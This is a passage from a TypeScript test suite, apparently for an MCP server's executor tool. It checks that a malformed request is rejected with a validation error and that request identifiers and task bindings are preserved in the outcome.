  it('T24: MCP tool rejects invalid/malformed request', async () => {
    const transport = new InMemoryMcpTransport();
    const delegate: McpOrchestratorDelegate = {
      isHealthy: () => true,
      projectRoot: tempDir,
      executorPort: adapter,
    };

    const server = new McpServer({
      transport,
      executorTools: true,
      delegate,
    });

    await server.start();
    const tool = server.getTool(AIDM_EXECUTOR_EXECUTE_TOOL_NAME)!;

    const res = await tool.handler(
      { request: { invalid: 'payload' } },
      {
        correlation: { correlationId: 'corr-err', requestId: 'req-mcp-err', receivedAt: new Date().toISOString() },
        delegate,
      }
    );

    assert.strictEqual(res.isError, true);
    const parsed = JSON.parse(res.content[0].text as string);
    assert.strictEqual(parsed.success, false);
    assert.strictEqual(parsed.code, 'ERR_EXECUTION_REQUEST_VALIDATION');

    await server.stop();
  });

  it('T25: MCP tool preserves requestBinding and requestId in outcome', async () => {
    const transport = new InMemoryMcpTransport();
    const delegate: McpOrchestratorDelegate = {
      isHealthy: () => true,
      projectRoot: tempDir,
      executorPort: adapter,
    };

    const server = new McpServer({
      transport,
      executorTools: true,
      delegate,
    });

    await server.start();
    const tool = server.getTool(AIDM_EXECUTOR_EXECUTE_TOOL_NAME)!;

    const res = await tool.handler(
      { request: sampleRequest },
      {
        correlation: { correlationId: 'corr-bind', requestId: 'req-mcp-bind', receivedAt: new Date().toISOString() },
        delegate,
      }
    );

    assert.ok(!res.isError);
    const parsed = JSON.parse(res.content[0].text as string);
    assert.strictEqual(parsed.outcome.requestId, sampleRequest.requestId);
    assert.strictEqual(parsed.outcome.requestBinding.taskId, 'TASK-P10-01');
    assert.strictEqual(parsed.outcome.requestBinding.taskRevision, 2);
    assert.strictEqual(parsed.outcome.requestBinding.contextFingerprint, sampleRequest.contextFingerprint);

    await server.stop();
  });
});
